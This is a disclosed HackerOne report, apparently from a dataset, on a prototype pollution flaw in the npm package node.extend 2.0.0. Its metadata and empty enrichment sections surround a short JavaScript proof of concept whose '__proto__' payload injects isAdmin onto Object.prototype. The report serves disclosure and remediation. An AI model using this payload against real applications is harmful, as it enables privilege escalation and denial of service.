---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '430831'
original_report_id: '430831'
title: Prototype pollution attack in node.extend
weakness: Uncontrolled Resource Consumption
team_handle: nodejs-ecosystem
created_at: '2018-10-30T11:42:18.593Z'
disclosed_at: '2018-11-30T14:01:57.458Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
asset_identifier: node.extend
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Prototype pollution attack in node.extend

## Metadata

- HackerOne Report ID: 430831
- Weakness: Uncontrolled Resource Consumption
- Program: nodejs-ecosystem
- Disclosed At: 2018-11-30T14:01:57.458Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a prototype pollution vulnerability in node.extend.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** node.extend
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/node.extend`

## Module Description

A port of jQuery.extend that actually works on node.js

## Module Stats

267,701 downloads in the last week

# Vulnerability

## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

`node.extend` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
Craft an object of form `{__proto__: {...}}` and send it to `node.extend`:
```javascript
let extend = require('node.extend');
extend(true, {}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
console.log({}.isAdmin); // true
```

# Wrap up

- I contacted the maintainer to let them know: [N]
- I opened an issue in the related repository: [N]

## Impact

Denial of service, possibly more depending on the application.
See https://hackerone.com/reports/310443

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
